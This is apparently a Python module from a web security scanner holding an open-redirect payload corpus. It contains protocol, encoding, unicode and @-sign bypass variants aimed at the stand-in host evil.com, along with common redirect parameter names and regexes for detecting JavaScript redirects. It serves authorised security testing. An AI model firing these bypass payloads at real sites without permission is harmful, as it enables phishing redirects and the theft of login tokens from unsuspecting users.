"""Open-redirect payload corpus (protocol + encoding variants).

Covers protocol-relative, absolute, port, slash, encoding, unicode, @-sign,
path-traversal and parameter-based bypasses. Marker host: evil.com (or a
configurable test host).
"""

# Base protocol payloads (literal from the canonical bypass table)
PROTOCOL_PAYLOADS = [
    "//evil.com", "//evil.com/", "///evil.com", "///evil.com/", "////evil.com", "////evil.com/", "/////evil.com",
    "https://evil.com", "https://evil.com/", "https://www.evil.com", "https://www.evil.com/", "https://subdomain.evil.com", "https://subdomain.evil.com/",
    "http://evil.com", "http://evil.com/", "http://www.evil.com", "http://www.evil.com/", "http://subdomain.evil.com", "http://subdomain.evil.com/",
    "https:evil.com", "http:evil.com", "https:/evil.com", "http:/evil.com",
    "https:///evil.com", "http:///evil.com", "https:////evil.com", "http:////evil.com",
    "//evil.com:80", "//evil.com:443", "//evil.com:8080", "//evil.com:8443",
    "https://evil.com:80", "http://evil.com:443", "https://evil.com:8080", "http://evil.com:8080", "https://evil.com:8443", "http://evil.com:8443",
    "//evil.com:80/", "//evil.com:443/", "https://evil.com:80/", "http://evil.com:443/",
    "////https://evil.com", "////http://evil.com", "///https://evil.com", "///http://evil.com",
    "//https://evil.com", "//http://evil.com", "/https://evil.com", "/http://evil.com",
    "/https:evil.com", "/http:evil.com", "//https:evil.com", "//http:evil.com",
    "///https:evil.com", "///http:evil.com", "////https:evil.com", "////http:evil.com",
    "//google.com", "//www.google.com", "https://google.com", "http://google.com", "//google.com/", "///google.com/", "////google.com/",
]

# Encoding / obfuscation payloads
ENCODING_PAYLOADS = [
    "//evil.com%00", "//evil.com%0D%0A", "//evil.com%0A", "//evil.com%00/",
    "https://evil.com%00", "http://evil.com%00",
    "//evil.com%20", "//evil.com%09", "//evil.com%0D", "//evil.com%0A",
    "https://evil.com%20", "http://evil.com%20", "https://evil.com%09", "http://evil.com%09",
    "https://evil.com%0D", "http://evil.com%0D", "https://evil.com%0A", "http://evil.com%0A",
    "//evil.com%E2%80%A8", "//evil.com%E2%80%A9", "https://evil.com%E2%80%A8", "http://evil.com%E2%80%A8", "https://evil.com%E2%80%A9", "http://evil.com%E2%80%A9",
    "%2F%2Fevil.com", "%2f%2fevil.com", "/%2f%2fevil.com", "/%2F%2Fevil.com",
    "//%2Fevil.com", "//%2fevil.com", "//evil.com%2f", "//evil.com%2F",
    "%5C%5Cevil.com", "%5c%5cevil.com", "/%5c%5cevil.com", "/%5C%5Cevil.com",
    "//%5Cevil.com", "//%5cevil.com",
    "/%2f%5cevil.com", "/%5c%2fevil.com", "//%252fevil.com", "//%255cevil.com",
    "/%252f%252fevil.com", "/%255c%255cevil.com", "//evil.com%252f", "//evil.com%252F",
    "//evil.com%252e%252e", "//evil.com%252E%252E",
    "//evil.com%2f..", "//evil.com%5C..", "//evil.com%2F..", "//evil.com%2f%2e%2e", "//evil.com%2F%2E%2E",
    "//evil.com%2f..;", "//evil.com%2F..;",
    "//evil.com%2Fvictim.com", "//evil.com%5Cvictim.com", "//evil.com%3Fvictim.com", "//evil.com%23victim.com",
    "https://evil.com%2Fvictim.com", "http://evil.com%2Fvictim.com", "https://evil.com%5Cvictim.com", "http://evil.com%5Cvictim.com",
    "https://evil.com%3Fvictim.com", "http://evil.com%3Fvictim.com", "https://evil.com%23victim.com", "http://evil.com%23victim.com",
    "/%09/evil.com", "/%2f/evil.com", "/%5c/evil.com", "//%09evil.com", "////%09evil.com", "////%2fevil.com", "////%5cevil.com",
    "//evil%00.com", "//evil%20.com", "//evil%09.com", "https://evil%00.com", "http://evil%00.com",
    "https://evil%20.com", "http://evil%20.com", "https://evil%09.com", "http://evil%09.com",
    "//evil%E3%80%82com", "//evil%u3002com", "//evil%u30FBcom", "https://evil%E3%80%82com", "http://evil%E3%80%82com",
    "https://evil.com%20@victim.com", "http://evil.com%20@victim.com", "https://evil.com%09@victim.com", "http://evil.com%09@victim.com",
    "https://evil.com%0D@victim.com", "http://evil.com%0D@victim.com", "https://evil.com%0A@victim.com", "http://evil.com%0A@victim.com",
    "https://evil.com%00@victim.com", "http://evil.com%00@victim.com",
    "//evil.com/%2F..", "//evil.com/%5C..", "//evil.com/%2F%2E%2E", "//evil.com/%5C%2E%2E",
    "https://evil.com/%2F..", "http://evil.com/%2F..", "https://evil.com/%5C..", "http://evil.com/%5C..",
    "//:%252F@evil.com", "//:%5C@evil.com", "https://:%252F@evil.com", "http://:%252F@evil.com", "https://:%5C@evil.com", "http://:%5C@evil.com",
]

# Common redirect parameter names for auto-detection
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_to", "next", "next_url", "return", "return_to", "returnUrl",
    "returnTo", "returnurl", "dest", "destination", "target", "target_url", "goto", "go", "out", "view",
    "image_url", "img_url", "continue", "continue_url", "rurl", "redir", "location", "link", "path", "u",
    "uri", "window", "forward", "back", "login_url", "callback", "cb", "ref", "referer", "redirect_uri", "redirectUri",
]

# JS / HTML redirect detection markers
JS_REDIRECT_RE = (
    r"(?:window\.)?location\s*[.=]\s*['\"]([^'\"]+)['\"]",
    r"(?:window\.)?location\.(?:href|replace|assign)\s*\(?\s*['\"]([^'\"]+)['\"]",
    r"window\.open\s*\(\s*['\"]([^'\"]+)['\"]",
    r"document\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"<meta[^>]+http-equiv=[\"']refresh[\"'][^>]+content=[\"'][^\"']*url=([^\"']+)",
    r"top\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"parent\.location\s*=\s*['\"]([^'\"]+)['\"]",
)


def all_payloads() -> list[str]:
    seen: set[str] = set()
    result: list[str] = []
    for payload in [*PROTOCOL_PAYLOADS, *ENCODING_PAYLOADS]:
        if payload not in seen:
            seen.add(payload)
            result.append(payload)
    return result